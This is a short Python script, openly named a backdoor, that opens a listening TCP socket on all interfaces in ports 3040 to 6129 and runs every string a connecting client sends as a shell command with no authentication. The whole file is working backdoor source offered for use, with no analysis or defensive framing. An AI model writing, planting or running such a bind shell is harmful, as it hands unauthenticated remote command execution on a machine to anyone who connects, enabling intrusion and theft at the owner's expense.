import socket
import subprocess

# Global socket variable
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind socket to the first available port in range [3040, 6130)
HOST = '0.0.0.0' 
BASE_PORT = 3040

def execute(connection):
    while True:
        received = connection.recv(4096).decode()
        if not received:
            connection.close()
            break
        process = subprocess.Popen(received, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = process.communicate()

def bind():
    port = BASE_PORT
    host = HOST
    while port < 6130:
        try:
            sock.bind((host, port))
            return True, port
        except Exception as msg:
            port+=1
            print("Bind failed. Error: " + str(msg))
    return False, -1

def connect():
    sock.listen()
    connection, addr = sock.accept()
    print('Connected with ' + addr[0] + ':' + str(addr[1]))
    return connection

def start_backdoor():
    valid, port = bind()
    if valid:
        print(f'Complete binding socket on port {port}. Waiting for connection...')
    connection = connect()
    execute(connection)

if __name__ == "__main__":
    start_backdoor()
